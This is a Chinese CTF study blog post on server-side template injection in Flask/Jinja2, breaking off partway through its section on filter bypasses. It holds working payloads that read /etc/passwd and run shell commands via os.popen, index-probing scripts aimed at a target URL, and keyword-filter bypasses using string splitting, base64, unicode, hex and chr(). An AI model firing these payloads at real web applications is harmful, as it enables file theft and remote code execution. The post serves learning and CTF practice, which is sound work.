[Will1am](/u/55743) / 2022-04-06 09:54:19 / 浏览数 5200

* * *

前言
--

之前对ssti进行了较为浅显的学习，通过考核发现了不少问题，东西没有学透，太不扎实了，自己独立做题的话会因为不同的过滤之类的出现很多的问题，刷题也都是机械性的，属于是无效刷题。在发现自己千疮百孔的ssti学习之后，痛定思痛决定对ssti重新再来一遍

SSTI是什么
-------

SSTI 全称（Server-Side Template Injection),中文名服务端模板注入，是由于接受用户输入而造成的安全问题，和sql注入有相似性。

它的实质在于服务器端接受了用户的输入，没有经过过滤或者说过滤不严谨，将用户输入作为web应用模板的一部分，但是在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露，代码执行，getshell等问题。

这个问题主要是出在web应用模板渲染的过程中，而python中的一个微型框架flask主要就是使用的jinja2来作为渲染模板，因此主要学习关于python flask的jinja2引发的SSTI。

服务器模板注入，那么什么是模板呢？

模板及模板引擎
-------

换句话说，模板就是一段话中存在可动态替换的部分。

```
print("hello{username}")
```

其中的username是可以人为输入或者产生影响的，可以动态替换。由于这句代码能够因为不同的username而显示不同的结果,因此我们可以简单的把这段话理解为一个模板。

而模板引擎的作用是为了使用户界面与业务数据或内容生成特定的文档。

换句话说这一过程可以简述为：拿到数据,塞到模板里,然后让渲染引擎将塞进去的东西生成 html 的文本,最后返回给浏览器.

但是渲染的数据是业务数据,且大多数都由用户提供,这就意味着用户对输入可控.如果后端没有对用户的输入进行检测和判断,那么就容易产生代码和数据混淆,从而产生注入漏洞可以被人注入。

Flask-jinja2 SSTI 一般利用姿势
------------------------

### 常用的魔术方法

之前做题的时候对其他大佬的payload总是看的一知半解，不知道为什么这样组合，为什么这样调用，现在从头再学，重新了解一下魔术方法的作用和组合。

ssti是源于python的，且通过import引入了许多的类与方法。python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是object，而object拥有众多的子类。

那字符串，字典，元组，列表有啥区别呢

* * *

* 字符串：str是不可变的，双引号或者单引号中的数据，就是字符串。str可进行的操作：下表索引、切片。

* 元组：python的元组与列表类似，可以进行下标索引、切片，不同之处在于元组的元素不能修改，它是不可变的有序集合。元组使用小括号，列表使用方括号，正是因为tuple不可变，所以代码更安全，如果可能，能用tuple代替list就尽量用tuple。

  * 序列类型：\[data1,data2....\]
  * tuple的注意点：tuple=(1,),只有1个元素的tuple定义时必须加一个逗号  

* 字典：用{ }表示，是无序的，可变的，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度，键不可变，是一个可hash对象，键值可变

  * 映射类型：通过键与键值映射实现数据存储和查找

  * 表示方式：{key1:value1,key2:value2......}

* 列表：list存储一系列有序集合，用\[ \]括起来，列表中的元素是可变的，即可以对列表进行修改
  * 序列类型：数据有位置顺序
  * 表示方式：\[data1,data2.....\]


* * *

`__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 **class** 是类的一个内置属性，表示类的类型，返回 ； 也是类的实例的属性，表示实例对象的类。简单来说，是用来返回的方法，用此方法来查看查找的内容。

```
>>> ''.__class__
<type 'str'>           //字符串
>>> ().__class__
<type 'tuple'>         //元组
>>> [].__class__
<type 'list'>          //列表
>>> {}.__class__
<type 'dict'>          //字典
```

`__bases__`：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组（虽然只有一个元素）。注意是直接父类。简单来说就是返回类型列表，得和读取的连起来使用，比如说`__class__`

```
>>> ().__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> [].__class__.__bases__
(<type 'object'>,)
>>> {}.__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__[0].__bases__[0] // python2下雨python3下不同
<type 'object'>
>>> [].__class__.__bases__[0]
<type 'object'>
```

`__mro__`：可以用来获取一个类的的调用顺序，可以用此方法来获取基类

```
>>> ''.__class__.__mro__    // python2下和python3下不同
(<class 'str'>, <class 'object'>)
>>> [].__class__.__mro__
(<class 'list'>, <class 'object'>)
>>> {}.__class__.__mro__
(<class 'dict'>, <class 'object'>)
>>> ().__class__.__mro__
(<class 'tuple'>, <class 'object'>)
>>> ().__class__.__mro__[1] // 返回的是一个类元组，使用索引就能获取基类了
<class 'object'>
```

`__base__`：使用此方法也可以直接获取基类

```
>>> ''.__class__.__base__
<class 'object'>             //python3下的
>>> ''.__class__.__base__    //python2下的
<type 'basestring'>
>>> [].__class__.__base__
<type 'object'>
>>> {}.__class__.__base__
<type 'object'>
>>> ().__class__.__base__
<type 'object'>
```

当掌握了这些类继承的方法，我们可以从任何一个变量回溯到最开始的基类`<clas'object'>`中，再去获得这个最开始的基类所有能实现的子类，既可以有很多的类和方法了。

`__subclass__()`：查看当前类的子类组成的列表，即返回基类`object`的子类。

```
>>>''.__class__.__bases__
(<class 'object'>)
>>>''.__class__.__bases__[0]
<class 'object'>
>>>''.__class__.__bases__.__subclasses__()
报错
```

对于这里的报错有些不解，问了一下S神

在第一次访问时返回的是`(<class 'object'>)`其外面有()的包裹，返回的为一整个数组，在第二次访问时选中了第0个，看到了没有()包裹的`<class 'object'>`这样才返回了object类，所以说报错的原因在于没有选中数组的第0个，只有选中了第0个才能在object类下面看到其子类。

修改一下

```
>>> ''.__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>,
<class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, 
<class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, 
<class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>,
<class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, 
<class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, 
<class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, 
<class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, 
<class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, 
<class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, 
<class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, 
<class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, 
<class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, 
<class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, 
<class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, 
<class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, 
<class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, 
<class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'PyHKEY'>, 
<class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, 
<class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'MultibyteCodec'>, <class 'MultibyteIncrementalEncoder'>,
<class 'MultibyteIncrementalDecoder'>, <class 'MultibyteStreamReader'>, <class 'MultibyteStreamWriter'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, 
<class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, 
<class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, 
<class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, 
<class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, 
<class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]
```

爆出来了很多的子类，而且非常杂乱，查阅起来有困难，我们整理一下：

python2下的类的使用和python3下类的使用有所不同，我们分开放

```
#python2
(0, <type 'type'>)
(1, <type 'weakref'>)
(2, <type 'weakcallableproxy'>)
(3, <type 'weakproxy'>)
(4, <type 'int'>)
(5, <type 'basestring'>)
(6, <type 'bytearray'>)
(7, <type 'list'>)
(8, <type 'NoneType'>)
(9, <type 'NotImplementedType'>)
(10, <type 'traceback'>)
(11, <type 'super'>)
(12, <type 'xrange'>)
(13, <type 'dict'>)
(14, <type 'set'>)
(15, <type 'slice'>)
(16, <type 'staticmethod'>)
(17, <type 'complex'>)
(18, <type 'float'>)
(19, <type 'buffer'>)
(20, <type 'long'>)
(21, <type 'frozenset'>)
(22, <type 'property'>)
(23, <type 'memoryview'>)
(24, <type 'tuple'>)
(25, <type 'enumerate'>)
(26, <type 'reversed'>)
(27, <type 'code'>)
(28, <type 'frame'>)
(29, <type 'builtin_function_or_method'>)
(30, <type 'instancemethod'>)
(31, <type 'function'>)
(32, <type 'classobj'>)
(33, <type 'dictproxy'>)
(34, <type 'generator'>)
(35, <type 'getset_descriptor'>)
(36, <type 'wrapper_descriptor'>)
(37, <type 'instance'>)
(38, <type 'ellipsis'>)
(39, <type 'member_descriptor'>)
(40, <type 'file'>)
(41, <type 'PyCapsule'>)
(42, <type 'cell'>)
(43, <type 'callable-iterator'>)
(44, <type 'iterator'>)
(45, <type 'sys.long_info'>)
(46, <type 'sys.float_info'>)
(47, <type 'EncodingMap'>)
(48, <type 'fieldnameiterator'>)
(49, <type 'formatteriterator'>)
(50, <type 'sys.version_info'>)
(51, <type 'sys.flags'>)
(52, <type 'sys.getwindowsversion'>)
(53, <type 'exceptions.BaseException'>)
(54, <type 'module'>)
(55, <type 'imp.NullImporter'>)
(56, <type 'zipimport.zipimporter'>)
(57, <type 'nt.stat_result'>)
(58, <type 'nt.statvfs_result'>)
(59, <class 'warnings.WarningMessage'>)
(60, <class 'warnings.catch_warnings'>)
(61, <class '_weakrefset._IterationGuard'>)
(62, <class '_weakrefset.WeakSet'>)
(63, <class '_abcoll.Hashable'>)
(64, <type 'classmethod'>)
(65, <class '_abcoll.Iterable'>)
(66, <class '_abcoll.Sized'>)
(67, <class '_abcoll.Container'>)
(68, <class '_abcoll.Callable'>)
(69, <type 'dict_keys'>)
(70, <type 'dict_items'>)
(71, <type 'dict_values'>)
(72, <class 'site._Printer'>)
(73, <class 'site._Helper'>)
(74, <class 'site.Quitter'>)
(75, <class 'codecs.IncrementalEncoder'>)
(76, <class 'codecs.IncrementalDecoder'>)
(77, <type '_sre.SRE_Pattern'>)
(78, <type '_sre.SRE_Match'>)
(79, <type '_sre.SRE_Scanner'>)
(80, <type 'operator.itemgetter'>)
(81, <type 'operator.attrgetter'>)
(82, <type 'operator.methodcaller'>)
(83, <type 'functools.partial'>)
(84, <type 'MultibyteCodec'>)
(85, <type 'MultibyteIncrementalEncoder'>)
(86, <type 'MultibyteIncrementalDecoder'>)
(87, <type 'MultibyteStreamReader'>)
(88, <type 'MultibyteStreamWriter'>)
```

```
#python3
(0, <class 'type'>)
(1, <class 'weakref'>)
(2, <class 'weakcallableproxy'>)
(3, <class 'weakproxy'>)
(4, <class 'int'>)
(5, <class 'bytearray'>)
(6, <class 'bytes'>)
(7, <class 'list'>)
(8, <class 'NoneType'>)
(9, <class 'NotImplementedType'>)
(10, <class 'traceback'>)
(11, <class 'super'>)
(12, <class 'range'>)
(13, <class 'dict'>)
(14, <class 'dict_keys'>)
(15, <class 'dict_values'>)
(16, <class 'dict_items'>)
(17, <class 'dict_reversekeyiterator'>)
(18, <class 'dict_reversevalueiterator'>)
(19, <class 'dict_reverseitemiterator'>)
(20, <class 'odict_iterator'>)
(21, <class 'set'>)
(22, <class 'str'>)
(23, <class 'slice'>)
(24, <class 'staticmethod'>)
(25, <class 'complex'>)
(26, <class 'float'>)
(27, <class 'frozenset'>)
(28, <class 'property'>)
(29, <class 'managedbuffer'>)
(30, <class 'memoryview'>)
(31, <class 'tuple'>)
(32, <class 'enumerate'>)
(33, <class 'reversed'>)
(34, <class 'stderrprinter'>)
(35, <class 'code'>)
(36, <class 'frame'>)
(37, <class 'builtin_function_or_method'>)
(38, <class 'method'>)
(39, <class 'function'>)
(40, <class 'mappingproxy'>)
(41, <class 'generator'>)
(42, <class 'getset_descriptor'>)
(43, <class 'wrapper_descriptor'>)
(44, <class 'method-wrapper'>)
(45, <class 'ellipsis'>)
(46, <class 'member_descriptor'>)
(47, <class 'types.SimpleNamespace'>)
(48, <class 'PyCapsule'>)
(49, <class 'longrange_iterator'>)
(50, <class 'cell'>)
(51, <class 'instancemethod'>)
(52, <class 'classmethod_descriptor'>)
(53, <class 'method_descriptor'>)
(54, <class 'callable_iterator'>)
(55, <class 'iterator'>)
(56, <class 'pickle.PickleBuffer'>)
(57, <class 'coroutine'>)
(58, <class 'coroutine_wrapper'>)
(59, <class 'InterpreterID'>)
(60, <class 'EncodingMap'>)
(61, <class 'fieldnameiterator'>)
(62, <class 'formatteriterator'>)
(63, <class 'BaseException'>)
(64, <class 'hamt'>)
(65, <class 'hamt_array_node'>)
(66, <class 'hamt_bitmap_node'>)
(67, <class 'hamt_collision_node'>)
(68, <class 'keys'>)
(69, <class 'values'>)
(70, <class 'items'>)
(71, <class 'Context'>)
(72, <class 'ContextVar'>)
(73, <class 'Token'>)
(74, <class 'Token.MISSING'>)
(75, <class 'moduledef'>)
(76, <class 'module'>)
(77, <class 'filter'>)
(78, <class 'map'>)
(79, <class 'zip'>)
(80, <class '_frozen_importlib._ModuleLock'>)
(81, <class '_frozen_importlib._DummyModuleLock'>)
(82, <class '_frozen_importlib._ModuleLockManager'>)
(83, <class '_frozen_importlib.ModuleSpec'>)
(84, <class '_frozen_importlib.BuiltinImporter'>)
(85, <class 'classmethod'>)
(86, <class '_frozen_importlib.FrozenImporter'>)
(87, <class '_frozen_importlib._ImportLockContext'>)
(88, <class '_thread._localdummy'>)
(89, <class '_thread._local'>)
(90, <class '_thread.lock'>)
(91, <class '_thread.RLock'>)
(92, <class '_frozen_importlib_external.WindowsRegistryFinder'>)
(93, <class '_frozen_importlib_external._LoaderBasics'>)
(94, <class '_frozen_importlib_external.FileLoader'>)
(95, <class '_frozen_importlib_external._NamespacePath'>)
(96, <class '_frozen_importlib_external._NamespaceLoader'>)
(97, <class '_frozen_importlib_external.PathFinder'>)
(98, <class '_frozen_importlib_external.FileFinder'>)
(99, <class 'nt.ScandirIterator'>)
(100, <class 'nt.DirEntry'>)
(101, <class '_io._IOBase'>)
(102, <class '_io._BytesIOBuffer'>)
(103, <class '_io.IncrementalNewlineDecoder'>)
(104, <class 'PyHKEY'>)
(105, <class 'zipimport.zipimporter'>)
(106, <class 'zipimport._ZipImportResourceReader'>)
(107, <class 'codecs.Codec'>)
(108, <class 'codecs.IncrementalEncoder'>)
(109, <class 'codecs.IncrementalDecoder'>)
(110, <class 'codecs.StreamReaderWriter'>)
(111, <class 'codecs.StreamRecoder'>)
(112, <class '_abc._abc_data'>)
(113, <class 'abc.ABC'>)
(114, <class 'dict_itemiterator'>)
(115, <class 'collections.abc.Hashable'>)
(116, <class 'collections.abc.Awaitable'>)
(117, <class 'types.GenericAlias'>)
(118, <class 'collections.abc.AsyncIterable'>)
(119, <class 'async_generator'>)
(120, <class 'collections.abc.Iterable'>)
(121, <class 'bytes_iterator'>)
(122, <class 'bytearray_iterator'>)
(123, <class 'dict_keyiterator'>)
(124, <class 'dict_valueiterator'>)
(125, <class 'list_iterator'>)
(126, <class 'list_reverseiterator'>)
(127, <class 'range_iterator'>)
(128, <class 'set_iterator'>)
(129, <class 'str_iterator'>)
(130, <class 'tuple_iterator'>)
(131, <class 'collections.abc.Sized'>)
(132, <class 'collections.abc.Container'>)
(133, <class 'collections.abc.Callable'>)
(134, <class 'os._wrap_close'>)
(135, <class 'os._AddedDllDirectory'>)
(136, <class '_sitebuiltins.Quitter'>)
(137, <class '_sitebuiltins._Printer'>)
(138, <class '_sitebuiltins._Helper'>)
```

可以看出2.7有的3.6大部分都有，但还是有一些子类是不一样的。

SSTI的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。

但python的版本不同，要利用的类的位置就不同，索引号就不同，下面借鉴了一下S神的遍历python环境中类的脚本：

```
#by S神
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
}
for i in range(500):
    url = "http://xxx.xxx.xxx.xxx:xxxx/?get参数={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url,headers=headers)
    if 'FileLoader' in res.text: #以FileLoader为例
        print(i)

# 得到编号为79
```

```
#by S神
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
}
for i in range(500):
    url = "http://xxx.xxx.xxx.xxx:xxxx/"
    postPara = {"post参数":"{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"}
    res = requests.post(url=url,headers=headers,data=postPara)
    if 'FileLoader' in res.text: #以FileLoader为例，查找其他命令时就用其他子类
        print(i)

# 得到编号为79
```

`__builtins__`：以一个集合的形式查看引用

builtins是python中的一个模块。该模块提供对Python的所有“内置”标识符的直接访问；例如，builtins.open 是内置函数的全名 open() 。

当我们启动一个python解释器时，即使没有创建任何变量或者函数，还是会有很多函数使用，我们称之为内建函数。

内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用。

`__builtins__`方法是作为默认初始模块出现的，可用于查看当前所有导入的内建函数。

`__globals__`：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性  
是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该  
文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全  
局变量的字典引用。

`__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 **import**()  
来动态载入，就是 import 。语法： **import**(模块名)

这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子  
类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现  
文件读取和命令执行的：

```
找到父类<type 'object'> ---> 寻找子类 ---> 找关于命令执行或者文件操作的模块。
```

### 用SSTI读取文件

#### python2

在上文中我们用`__subclass__`看到了基类的所有子类，在我们整理的子类中的第四十项`(40, <type 'file'>)`（实际的索引可能不同，需要动态识别），可以用于读写文档

```
>>>[].__class__.__mro__[-1].__subclasses__()[40]
<type 'file'>
>>>[].__class__.__mro__[-1].__subclasses__()[40]("/etc/passwd").read()
'##\n# User Database\n# \......'
builtins
```

#### python3

使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用  
这个类去读取文件。

首先编写脚本遍历目标Python环境中 `<class '_frozen_importlib_external.FileLoader'>`这个类索引号：

```
import requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
for i in range(500):
    url = "http://47.xxx.xxx.72:8000/?name=
{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
    res = requests.get(url=url, headers=headers)
    if 'FileLoader' in res.text:
        print(i)
# 得到编号为79
```

### 利用SSTI执行命令

可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的  
eval函数即os模块执行命令。

#### 寻找内建函数eval执行命令

```
import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}
for i in range(500):
    url = "http://3d25cf80-d891-4046-86a7-931d17efb62d.challenge.ctf.show/?name=\
        {{().__class__.__bases__[0].__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"

res = requests.get(url=url, headers=headers)
if 'eval' in res.text:
    print(i)
```

[![](assets/ssti-20220317200240-uve3txo.png)
](assets/ssti-20220317200240-uve3txo.png)

记住几个含有eval函数的类

```
warnings.catch_warnings
WarningMessage
codecs.IncrementalEncoder
codecs.IncrementalDecoder
codecs.StreamReaderWriter
os._wrap_close
reprlib.Repr
weakref.finalize
etc.
```

#### 寻找 os 模块执行命令

Python的 os 模块中有system和popen这两个函数可用来执行命令。其中`system()`函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；`popen()`函数执行命令有回显。所以比较常用的函数为`popen()`函数，而当`popen()`函数被过滤掉时，可以使用`system()`函数代替。

首先编写脚本遍历目标Python环境中含有os模块的类的索引号

```
import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}
for i in range(500):
    url = "http://3d25cf80-d891-4046-86a7-931d17efb62d.challenge.ctf.show/?name=\
        {{().__class__.__bases__[0].__subclasses__()[" + str(i) + "].__init__.__globals__}}"

res = requests.get(url=url, headers=headers)
if 'os.py' in res.text:
    print(i)
```

但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。  
我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 os.\_wrap\_close ，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。

#### 寻找 popen 函数执行命令

```
import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}
for i in range(500):
    url = "http://3d25cf80-d891-4046-86a7-931d17efb62d.challenge.ctf.show/?name=\
        {{().__class__.__bases__[0].__subclasses__()[" + str(i) + "].__init__.__globals__}}"

res = requests.get(url=url, headers=headers)
if 'popen' or 'os._wrap_close' in res.text:
    print(i)
```

如何绕过
----

在做题的时候我们会遇到各种各样的过滤，既然有过滤我们想要执行命令的话就必须绕过，那么如何绕过呢？

### 检查过滤

这里用到一款软件superdic，其可李用以自动生成fuzz字典，然后利用bp抓包工具对注入点进行注入，很容易就可以得到该题过滤了什么。

### 关键字绕过

#### 拼接绕过

我们可以利用“+”进行字符串拼接，绕过关键字过滤

但是往往这种绕过需要一定的条件，返回的要是字典类型的或是字符串格式（即str）的，即payload中引号内的，在调用的时候才可以使用字符串拼接绕过，我们要学会怎么把被过滤的命令放在能拼接的地方。

```
{{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}
```

payload中引号内的，在调用的时候都可以使用字符串拼接绕过。

#### 编码绕过

##### base64编码绕过

对引号内的代码进行base64编码后再后接`.decode('base64')`可以进行绕过

例如

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

编码后为

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
```

只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13，16进制编码。这一切都是基于我们可以执行命令实现的。

##### 利用Unicode编码绕过

这种方法网上没有，看了whoami大神和S神的笔记才知道还有这种方法。

例如

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

转换后为

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
```

当我们使用eval来执行命令时几乎所有命令都是置于引号之下的，所以我们利用对引号内的内容进行编码绕过的话是可以轻松绕过许多过滤的，例如对os，ls等的过滤。

##### 利用hex编码绕过

当过滤了`u`时，上面的Unicode与base64编码就不灵了，所以我们需要使用一种与前两种编码形式区别较大的编码来进行绕过

我们可以利用hex编码的方法进行绕过

例如

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

转换后为

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
```

这里注意，在进行hex编码的时候我们需要选用`/x`的形式，这样才能有效绕过。

##### 利用引号绕过

单双引号都行，假如过滤了flag时，我们可以使用`fl''ag`或者`fl""ag`的形式来绕过

例如

```
().__class__.__base__.__subclasses__()[77].__init__.__globals__['o''s'].popen('ls').read()

[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()
```

只要是字符串的，即payload中引号内的，都可以用引号绕过

#### 利用join()函数绕过

我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：

```
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
```

这也是基于对PHP函数命令的理解来的。

### 绕过其他字符

#### 过滤了中括号`[]`

##### 利用`__getitem__()`绕过

可以使用**getitem**()方法输出序列属性中某个索引处的元素（相当于\[\]），例如

```
>>> "".__class__.__mro__[2]
<type 'object'>
>>> "".__class__.__mro__.__getitem__(2)
<type 'object'>
```

所以我们可以得到

```
[]=__getitem__()
```

例子

```
{{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性

{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属性
```

##### 利用字典读取绕过

我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号`[]`里来访问，一种就是用点`.`来访问。所以，当方括号`[]`被过滤之后，我们还可以用点`.`的方式来访问，如下示例

首先构造

```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

绕过后

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval('__import__("os").popen("ls /").read()')}}
```

```
不难看出['__builitins__']=.__builtins__.
所以可以['']=..
```

#### 过滤了引号`''""`

##### 利用chr()绕过

因为知识比较匮乏，所以补充了一下`chr()`函数是干啥的

* * *

描述

chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。

语法

以下是 chr() 方法的语法:

```
chr(i)
```

参数

*   i -- 可以是10进制也可以是16进制的形式的数字。

返回值

返回值是当前整数对应的 ASCII 字符。

* * *

所以`chr()`这个函数可以绕过直接输入，利用返回的相对应的ASCll字符来执行命令

但是我们没法直接使用chr函数，所以我们需要先通过`__builtins__`来找到它（`__builtins__`方法是作为默认初始模块出现的，可用于查看当前所有导入的内建函数。）

```
{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}
```

然后我们再去赋值给chr，后面拼接字符串

```
{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
```

整合在一起就变成了

```
